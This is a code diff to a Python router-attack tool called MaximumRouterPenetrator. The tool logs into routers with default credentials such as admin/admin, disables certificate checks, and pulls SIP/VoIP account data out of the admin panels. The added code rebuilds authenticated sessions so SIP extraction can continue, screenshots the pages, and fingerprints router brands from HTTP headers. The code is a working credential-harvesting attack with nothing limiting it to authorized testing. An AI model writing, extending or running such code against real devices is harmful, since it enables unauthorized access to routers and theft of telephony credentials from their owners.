@@ -113,6 +113,9 @@ class MaximumRouterPenetrator:
         if hasattr(self, 'screenshot_config'):
             self.screenshot_config['enabled'] = True
         
+        # Ensure screenshot mode is always enabled
+        self.screenshot_mode = True
+        
         # Your priority credentials (VERIFIED testing) - ONLY THESE 4 WILL BE TESTED
         self.priority_credentials = [
             ('admin', 'admin'),
@@ -762,7 +765,7 @@ class MaximumRouterPenetrator:
                     if verbose:
                         # Show access details
                         brand = penetration_result.get('router_info', {}).get('brand', 'unknown')
-                        creds = penetration_result.get('credentials', 'unknown')
+                        creds = penetration_result.get('credentials', penetration_result.get('working_credential', 'unknown'))
                         if isinstance(creds, tuple):
                             creds = f"{creds[0]}:{creds[1]}"
                         print(f"         🏷️ Router: {brand.upper()}")
@@ -1142,6 +1145,35 @@ class MaximumRouterPenetrator:
                 print(f"   • Extracting SIP account information")
                 print(f"   • Taking VoIP page screenshots")
                 print(f"         🔐 LIVE DEBUG: Starting comprehensive SIP extraction...")
+            
+            # Ensure session is available for SIP extraction
+            if not auth_result.get('session') and auth_result.get('credentials'):
+                try:
+                    if REQUESTS_AVAILABLE:
+                        session = requests.Session()
+                        session.auth = (auth_result['credentials'][0], auth_result['credentials'][1])
+                        session.verify = False
+                        auth_result['session'] = session
+                        if verbose:
+                            print(f"         ✅ LIVE DEBUG: Session recreated for SIP extraction")
+                except Exception as e:
+                    if verbose:
+                        print(f"         ❌ LIVE DEBUG: Session recreation failed: {str(e)[:50]}")
+            
+            # Enhanced SIP extraction from admin panel
+            if verbose:
+                print(f"         📞 LIVE DEBUG: Searching for VoIP/SIP in admin panel...")
+            
+            # Use session if available, otherwise use urllib
+            if auth_result.get('session'):
+                sip_result = self._extract_sip_from_admin_panel(target_ip, auth_result, verbose)
+            else:
+                sip_result = self._extract_sip_from_admin_panel_urllib(target_ip, auth_result, verbose)
+            
+            if sip_result['success']:
+                result['sip_from_admin'] = sip_result['sip_data']
+                if verbose:
+                    print(f"         ✅ SIP data from admin panel: {len(sip_result['sip_data'])} accounts")
             
             # Search for config files and extract SIP
             if verbose:
@@ -1544,13 +1576,68 @@ class MaximumRouterPenetrator:
                     except:
                         continue
             
-            # Step 5: Final determination (LOWERED THRESHOLD)
+            # Step 5: Enhanced brand detection from HTTP headers
             if router_info['detection_score'] >= 3 or detected_brand or router_info['has_web_interface']:
                 router_info['is_router'] = True
-                if detected_brand:
-                    router_info['brand'] = detected_brand
+                
+                # Enhanced brand detection from HTTP headers
+                if not detected_brand:
+                    try:
+                        # Get HTTP headers for brand detection
+                        if REQUESTS_AVAILABLE:
+                            response = requests.get(f"http://{ip}/", timeout=self.performance_config['timeouts']['connection'], verify=False)
+                            headers = response.headers
+                        else:
+                            response = urllib.request.urlopen(f"http://{ip}/", timeout=self.performance_config['timeouts']['connection'])
+                            headers = {}
+                        
+                        server_header = headers.get('Server', '').lower()
+                        www_auth = headers.get('WWW-Authenticate', '').lower()
+                        
+                        # Brand detection based on headers
+                        brand_indicators = {
+                            'cisco': ['cisco', 'ios', 'catalyst', 'asr', 'isr'],
+                            'netgear': ['netgear', 'genie', 'nighthawk'],
+                            'tplink': ['tplink', 'tp-link', 'archer'],
+                            'dlink': ['dlink', 'd-link', 'dir'],
+                            'linksys': ['linksys', 'smart', 'wrt'],
+                            'asus': ['asus', 'asuswrt', 'merlin'],
+                            'huawei': ['huawei', 'hg', 'ont'],
+                            'zyxel': ['zyxel', 'zywall'],
+                            'fortinet': ['fortinet', 'fortigate'],
+                            'sonicwall': ['sonicwall', 'sonicos'],
+                            'pfsense': ['pfsense', 'freebsd'],
+                            'mikrotik': ['mikrotik', 'routeros'],
+                            'ubiquiti': ['ubiquiti', 'unifi', 'edgeos']
+                        }
+                        
+                        max_score = 0
+                        for brand, indicators in brand_indicators.items():
+                            score = 0
+                            for indicator in indicators:
+                                if indicator in server_header:
+                                    score += 3
+                                if indicator in www_auth:
+                                    score += 2
+                                if indicator in content.lower():
+                                    score += 1
+                            
+                            if score > max_score:
+                                max_score = score
+                                detected_brand = brand
+                        
+                        if max_score > 0:
+                            router_info['brand'] = detected_brand
+                            router_info['detection_score'] += max_score
+                            if verbose:
+                                print(f"         ✅ LIVE DEBUG: Brand detected from headers: {detected_brand.upper()} (score: {max_score})")
+                        else:
+                            router_info['brand'] = 'generic_router'
+                            
+                    except Exception:
+                        router_info['brand'] = 'generic_router'
                 else:
-                    router_info['brand'] = 'generic_router'
+                    router_info['brand'] = detected_brand
                 
                 if verbose:
                     print(f"         ✅ LIVE DEBUG: ROUTER CONFIRMED!")
